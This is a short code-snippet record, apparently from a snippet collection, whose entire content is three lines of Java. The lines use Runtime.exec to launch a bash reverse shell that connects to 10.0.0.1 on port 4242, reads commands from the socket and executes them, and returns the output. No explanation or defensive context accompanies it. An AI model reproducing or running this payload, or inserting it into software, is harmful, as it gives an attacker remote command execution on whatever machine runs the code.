---
id: ae2e332e-6ffa-4143-ac66-d423ea8bd772
type: code
language: Java
verified: false
created_at: '2023-04-06T03:56:24.528775+00:00'
updated_at: '2023-04-10T20:25:28.815655+00:00'
---

# Code Snippet ae2e332e

**Language**: Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();

```


